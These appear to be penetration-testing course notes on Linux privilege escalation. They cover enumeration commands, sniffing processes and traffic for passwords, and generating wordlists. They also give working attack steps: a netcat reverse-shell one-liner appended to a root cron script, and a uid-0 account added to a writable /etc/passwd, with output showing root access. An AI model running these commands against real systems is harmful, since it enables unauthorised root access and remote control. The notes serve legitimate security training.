---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 17: Linux Privilege Escalation

## Enumerating Linux

A **very** useful site for privilege escalation:

{% embed url="https://gtfobins.github.io/" %}

### Understanding Files and Users Privileges on Linux

File permissions, nothin' fancy to add.

### Manual Enumeration

```bash
# Various places to gather information
kali@kali:~$ hostname # Device name
kali@kali:~$ cat /etc/issue # OS Version
kali@kali:~$ cat /etc/os-release # Release-specific information
kali@kali:~$ uname -a # Kernel Version & Architecture
kali@kali:~$ ps aux # List all running services (with or without a tty) in user-readable format
kali@kali:~$ ip a # TCP/IP information for every network adapter
kali@kali:~$ routel # List routing information
kali@kali:~$ ss -anp # List all network connections w/o name resolution, including process name owning the connection
kali@kali:~$ cat /etc/iptables/rules.v4 # Reading firewall rules
kali@kali:~$ ls -lah /etc/cron* # Scheduled task scripts
kali@kali:~$ crontab -l # List the current user's scheduled jobs
kali@kali:~$ dpkg -l # List installed applications on Debian system
kali@kali:~$ find / -writable -type d 2>/dev/null # Finding all writable directories
kali@kali:~$ cat /etc/fstab # List all auto-mounted filesystems
kali@kali:~$ mount # List all currently mounted filesystems
kali@kali:~$ lsblk # View all available disks
kali@kali:~$ lsmod # List kernel modules
kali@kali:~$ /sbin/modinfo <module> # Gather additional information on a kernel module
kali@kali:~$ find / -perm -u=s -type f 2>/dev/null # Finding all files with the SUID bit set
```

### Automated Enumeration

Bash script to check for privilege escalation vectors: `/usr/bin/unix-privesc-check`\
Note: This runs via /bin/sh by default, run with bash to avoid issues with if statements.

## Exposed Confidential Information

### Inspecting User Trails

Check environment variables via `env`, dig into where they come from if important information is stored to validate it.

Creating a custom wordlist with `crunch`:

{% code overflow="wrap" %}
```bash
# This generates a wordlist with a minimum and maximum character length of 6, specifying the pattern with -t.
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
```
{% endcode %}

### Inspecting Service Footprints

Watching for processes that may be started with important information:

```bash
kali@kali:~$ watch -n 1 'ps aux | grep -i pass'
```

If we have privileges to capture network traffice:

```bash
kali@kali:~$ sudo tcpdump -i <interface> -A | grep -i 'pass'
```

## Insecure File Permissions

### Abusing Cron Jobs

Searching syslog for cronjobs (also reviewing **/var/log/cron.log**):

{% code overflow="wrap" lineNumbers="true" %}
```bash
kali@kali:~$ grep 'CRON' /var/log/syslog
# Determining permission of script run as root via cronjob
kali@kali:~$ ls -l /home/joe/.scripts/user_backups.sh

# Adding a one-liner reverse shell to the script
kali@kali:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your.listener.ip.here port >/tmp/f" >> user_backups.sh
```
{% endcode %}

### Abusing Password Authentication

If the **/etc/passwd** file is writable, we can abuse this due to Linux using authentication here prior to **/etc/shadow** for backwards compatability.

Generating a hash via `openssl` then adding it to **/etc/passwd** if it's writable:

```bash
kali@kali:~$ openssl passwd w00t
.lTs.02x/lWNE

kali@kali:~$ echo 'root2:.lTs.02x/lWNE:0:0:root:/root:/bin/bash' >> /etc/passwd

kali@kali:~$ su - root2
Password: w00t

root@debian-privesc:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Insecure System Components

### Abusing Setuid Binaries and Capabilities

Searching for binaries with capability misconfigurations:

```bash
kali@kali:~$ /usr/sbin/getcap -r / 2>/dev/null
kali@kali:~$ find / -type f -perm -u=s -user root 2>/dev/null
```

### Abusing Sudo

See what commands can be potentially abused via sudo:

```bash
kali@kali:~$ sudo -l
```

### Exploiting Kernel Vulnerabilities

{% hint style="warning" %}
Kernel exploits can be volatile, be careful just tossing them around.
{% endhint %}
